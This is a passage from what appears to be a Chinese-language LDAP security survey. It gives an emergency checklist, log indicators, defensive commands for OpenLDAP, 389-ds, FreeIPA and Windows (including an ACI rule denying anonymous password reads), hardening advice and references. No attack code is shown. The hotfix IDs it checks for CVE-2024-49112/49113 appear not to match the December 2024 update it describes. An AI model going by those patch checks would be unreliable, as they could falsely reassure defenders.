**代表漏洞**：CVE-2020-25709（证书验证 DoS）、CVE-2023-4727（Admin Cert 绕过）

**共性特征**：
- TLS/SSL 握手过程中的异常处理不当
- 证书链验证逻辑存在缺陷
- 证书格式解析中的空指针解引用

**防御重点**：
- 使用最新的 TLS 库（OpenSSL 3.x）
- 实施严格的证书验证策略
- 定期轮换证书和密钥

---

## 0x07 应急排查与防守建议

### 紧急排查清单

- [ ] 检查 Windows 系统是否已安装 2024-12 月安全更新（针对 CVE-2024-49112/49113）
- [ ] 检查 OpenLDAP 版本，确认是否为 2.5.x 或更高版本
- [ ] 检查 389-ds-base 版本，确认是否为 2.0.14+ 或 2.5.2+
- [ ] 检查 FreeIPA/Dogtag PKI 版本，确认是否为最新修复版本
- [ ] 审查 LDAP 服务的匿名绑定配置
- [ ] 检查 ACL 规则是否正确覆盖所有属性
- [ ] 检查 Proxy 模块的缓存配置
- [ ] 检查 TLS 证书配置和验证策略
- [ ] 审查最近的 LDAP 访问日志，寻找异常查询模式
- [ ] 检查系统日志中是否有 slapd/ns-slapd 进程崩溃记录

### 日志关键字段表

| 产品 | 日志位置 | 关键字段 | 异常特征 |
|------|---------|---------|---------|
| OpenLDAP | /var/log/slapd.log | conn=, op= | 异常 Modify/Add 请求 |
| 389-ds | /var/log/dirsrv/slapd-*/errors | Connection from | 高频匿名查询 |
| 389-ds | /var/log/dirsrv/slapd-*/access | RESULT | 大量 sensitive 属性返回 |
| FreeIPA | /var/log/httpd/error_log | SSL_ERROR | TLS 握手失败 |
| Windows | Security Event Log | Event ID 4625 | 异常 LDAP 绑定失败 |
| Windows | System Event Log | Event ID 1000 | lsass.exe 崩溃 |

### 紧急缓解措施

**针对 CVE-2024-49112/49113（LDAPBleed/LDAPNightmare）**：
```powershell
# 检查是否已安装补丁
Get-HotFix -Id KB5034441
Get-HotFix -Id KB5034439

# 如无法立即打补丁，可通过防火墙限制出站 LDAP 连接
New-NetFirewallRule -DisplayName "Block Outbound LDAP" -Direction Outbound -Protocol TCP -RemotePort 389,636 -Action Block
```

**针对 OpenLDAP DoS（CVE-2020-25710/25709）**：
```bash
# 限制匿名绑定
cat >> /etc/openldap/slapd.conf << 'EOF'
disallow bind_anon
EOF

# 重启 slapd
systemctl restart slapd
```

**针对 389-ds 访问控制绕过（CVE-2022-2850）**：
```bash
# 加强 ACI 规则，禁止匿名读取敏感属性
ldapmodify -x -D "cn=Directory Manager" -W << 'EOF'
dn: dc=example,dc=com
changetype: modify
add: aci
aci: (targetattr="userPassword")(version 3.0; acl "Deny anonymous password read"; deny (read, search, compare) userdn = "ldap:///anyone";)
EOF
```

**针对 FreeIPA（CVE-2023-4727/2024-22316）**：
```bash
# 更新 FreeIPA
dnf update --security -y

# 重启 FreeIPA 服务
ipactl restart
```

### 长期安全加固建议

1. **补丁管理**：建立每月定期补丁更新机制，优先处理 CVSS ≥ 9.0 的漏洞
2. **网络隔离**：将 LDAP 服务放置在独立的 VLAN 中，限制访问来源
3. **TLS 强制**：禁用明文 LDAP，强制使用 LDAPS（636）或 StartTLS
4. **匿名绑定控制**：默认禁用匿名绑定，仅在必要时启用受限的匿名查询
5. **ACL 最小化**：遵循最小权限原则，仅授予必要的属性访问权限
6. **日志审计**：启用详细的 LDAP 访问日志，配置 SIEM 告警规则
7. **监控告警**：监控 slapd/ns-slapd 进程状态、连接数异常、查询频率异常
8. **定期扫描**：使用 Nuclei 等工具定期扫描已知漏洞
9. **备份策略**：定期备份目录数据和配置，确保快速恢复能力
10. **安全培训**：对运维人员进行 LDAP 安全配置和应急响应培训

---

## 0x08 参考资料

1. Microsoft Security Update Guide - CVE-2024-49112: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49112
2. Microsoft Security Update Guide - CVE-2024-49113: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49113
3. OpenLDAP ITS - CVE-2020-25710: https://www.openldap.org/its/?findid=9944
4. OpenLDAP ITS - CVE-2020-25709: https://www.openldap.org/its/?findid=9943
5. OpenLDAP ITS - CVE-2022-22543: https://www.openldap.org/its/?findid=9947
6. 389-ds-base GitHub - CVE-2022-2850: https://github.com/389ds/389-ds-base/issues/5393
7. 389-ds-base GitHub - CVE-2021-3514: https://github.com/389ds/389-ds-base/issues/4825
8. 389-ds-base GitHub - CVE-2024-3657: https://github.com/389ds/389-ds-base/issues/5800
9. Red Hat Security Advisory - CVE-2023-4727: https://access.redhat.com/security/cve/CVE-2023-4727
10. FreeIPA Ticket System - CVE-2024-22316: https://pagure.io/freeipa/issue/9348
11. CISA Known Exploited Vulnerabilities Catalog: https://www.cisa.gov/known-exploited-vulnerabilities-catalog
12. NVD - National Vulnerability Database: https://nvd.nist.gov/

---

> **免责声明**：本文所有漏洞分析、PoC 脚本和 Nuclei 检测模板仅供安全研究人员在**获得授权的测试环境**中使用。未经授权对他人系统进行测试属于违法行为。本文作者不对因使用本文内容导致的任何直接或间接损失承担责任。请遵守当地法律法规，合法合规地进行安全研究。
